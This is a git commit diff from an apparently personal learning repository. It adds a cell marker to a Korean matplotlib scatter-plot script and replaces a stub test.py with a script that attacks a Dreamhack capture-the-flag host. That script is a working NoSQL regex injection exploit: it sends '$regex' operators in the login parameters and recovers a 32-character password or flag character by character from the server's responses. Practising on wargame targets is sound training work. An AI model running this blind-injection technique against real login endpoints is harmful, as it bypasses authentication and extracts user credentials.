a133094a010bafe6d3466a43147ff111c23be01c
jamin12 <rudals9901@naver.com>
2022-03-30 19:45:10 +0900

    ...

--- python/data_Analysis_visual/Matplotilb/15_산점도 그래프.py
+++ python/data_Analysis_visual/Matplotilb/15_산점도 그래프.py
@@ -33,3 +33,4 @@ plt.scatter(df['영어'],df['수학'],s=sizes,c=df['학년'],cmap='viridis',alph
 plt.xlabel('영어 점수')
 plt.ylabel('수학 점수')
 plt.colorbar(ticks=[1,2,3], label = '학년',shrink=0.3)
+# %%
--- python/test.py
+++ python/test.py
@@ -1,7 +1,13 @@
-def hihi():
-    print("gigi")
+import requests,string
 
-
-hihi
-
-
+HOST = 'http://host1.dreamhack.games:9151'
+ALPHANUMERIC = string.digits + string.ascii_letters
+SUCCESS = 'admin'
+flag = ''
+for i in range(32):
+    for ch in ALPHANUMERIC:
+        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
+        if response.text == SUCCESS:
+            flag += ch
+            break
+    print(f'FLAG: DH{{{flag}}}')
